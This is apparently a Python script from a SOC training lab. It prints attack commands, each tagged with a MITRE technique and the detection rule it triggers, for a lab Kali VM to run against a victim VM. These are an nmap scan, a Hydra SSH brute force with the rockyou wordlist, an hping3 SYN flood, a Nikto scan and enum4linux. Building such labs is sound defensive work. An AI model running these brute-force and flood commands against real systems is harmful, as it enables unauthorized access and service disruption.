"""
simulate_attack.py
──────────────────
SOC Lab — Attack Simulation Scripts
Run these from Kali Linux VM to generate
real network traffic for your SOC lab.
These are SAFE educational scripts — no real attacks.
Use ONLY in your isolated lab environment.
"""

import subprocess
import time
import random
import sys

# ── Lab IP Configuration ──────────────────────────────
VICTIM_IP   = "192.168.56.20"   # Your Ubuntu victim VM
GATEWAY_IP  = "192.168.56.1"
ATTACKER_IP = "192.168.56.30"   # Your Kali VM


def banner():
    print("""
╔══════════════════════════════════════════════════╗
║   SOC Lab — Attack Simulation Scripts            ║
║   ⚠️  Use ONLY in isolated lab environment       ║
╚══════════════════════════════════════════════════╝
    """)


# ══════════════════════════════════════════════════════
#  SIMULATION 1 — PORT SCAN (Nmap)
# ══════════════════════════════════════════════════════

def simulate_port_scan():
    """
    Simulate port scan using Nmap.
    Triggers RULE-002 in the SOC.
    MITRE: T1046 — Network Service Discovery
    """
    print("\n[*] Simulating Port Scan (Nmap)...")
    print(f"    Source: {ATTACKER_IP} → Target: {VICTIM_IP}")
    print(f"    MITRE: T1046 — Network Service Discovery")

    cmd = f"nmap -sS -p 1-1000 {VICTIM_IP}"
    print(f"\n    Command: {cmd}")
    print("    Run this on Kali VM to trigger SOC alert\n")

    # Actual command (uncomment in lab):
    # subprocess.run(cmd.split(), capture_output=True)


# ══════════════════════════════════════════════════════
#  SIMULATION 2 — SSH BRUTE FORCE (Hydra)
# ══════════════════════════════════════════════════════

def simulate_brute_force():
    """
    Simulate SSH brute force using Hydra.
    Triggers RULE-001 in the SOC.
    MITRE: T1110 — Brute Force
    """
    print("\n[*] Simulating SSH Brute Force (Hydra)...")
    print(f"    Source: {ATTACKER_IP} → Target: {VICTIM_IP}:22")
    print(f"    MITRE: T1110 — Brute Force")

    wordlist = "/usr/share/wordlists/rockyou.txt"
    cmd      = f"hydra -l admin -P {wordlist} ssh://{VICTIM_IP} -t 4"
    print(f"\n    Command: {cmd}")
    print("    Run this on Kali VM to trigger SOC alert\n")


# ══════════════════════════════════════════════════════
#  SIMULATION 3 — DDoS / SYN FLOOD (hping3)
# ══════════════════════════════════════════════════════

def simulate_ddos():
    """
    Simulate SYN flood using hping3.
    Triggers RULE-003 in the SOC.
    MITRE: T1499 — Endpoint Denial of Service
    """
    print("\n[*] Simulating DDoS SYN Flood (hping3)...")
    print(f"    Source: {ATTACKER_IP} → Target: {VICTIM_IP}:80")
    print(f"    MITRE: T1499 — Endpoint Denial of Service")

    cmd = f"hping3 -S --flood -p 80 {VICTIM_IP}"
    print(f"\n    Command: {cmd}")
    print("    ⚠️  Run briefly (5-10 sec) — captures evidence quickly\n")


# ══════════════════════════════════════════════════════
#  SIMULATION 4 — VULNERABILITY SCAN (Nikto)
# ══════════════════════════════════════════════════════

def simulate_web_scan():
    """
    Simulate web vulnerability scan using Nikto.
    MITRE: T1190 — Exploit Public-Facing Application
    """
    print("\n[*] Simulating Web Vulnerability Scan (Nikto)...")
    print(f"    Source: {ATTACKER_IP} → Target: http://{VICTIM_IP}")
    print(f"    MITRE: T1190 — Exploit Public-Facing Application")

    cmd = f"nikto -h http://{VICTIM_IP}"
    print(f"\n    Command: {cmd}")
    print("    Run this on Kali VM — web scanner triggers WAF alerts\n")


# ══════════════════════════════════════════════════════
#  SIMULATION 5 — FULL ATTACK CHAIN
# ══════════════════════════════════════════════════════

def simulate_attack_chain():
    """
    Full kill chain simulation — demonstrates multi-stage attack.
    """
    print("\n[*] Full Attack Chain Simulation")
    print("    Simulates: Recon → Initial Access → Lateral Movement\n")

    steps = [
        ("Phase 1 - Reconnaissance",  f"nmap -sV {VICTIM_IP}",              "T1046"),
        ("Phase 2 - Brute Force",      f"hydra -l root -P passwords.txt ssh://{VICTIM_IP}", "T1110"),
        ("Phase 3 - Web Scan",         f"nikto -h http://{VICTIM_IP}",       "T1190"),
        ("Phase 4 - Enum Post-Access", f"enum4linux {VICTIM_IP}",            "T1087"),
    ]

    for phase, cmd, mitre in steps:
        print(f"  [{mitre}] {phase}")
        print(f"          CMD: {cmd}\n")
        time.sleep(0.5)


# ══════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════

def main():
    banner()
    print("  Select simulation to run:")
    print("  [1] Port Scan (Nmap)         → MITRE T1046")
    print("  [2] SSH Brute Force (Hydra)  → MITRE T1110")
    print("  [3] DDoS SYN Flood (hping3)  → MITRE T1499")
    print("  [4] Web Vuln Scan (Nikto)    → MITRE T1190")
    print("  [5] Full Attack Chain")
    print("  [0] Exit\n")

    choice = input("  Choice: ").strip()

    handlers = {
        "1": simulate_port_scan,
        "2": simulate_brute_force,
        "3": simulate_ddos,
        "4": simulate_web_scan,
        "5": simulate_attack_chain,
    }

    if choice in handlers:
        handlers[choice]()
    elif choice == "0":
        print("  Exiting.")
        sys.exit(0)
    else:
        print("  Invalid choice.")


if __name__ == "__main__":
    main()
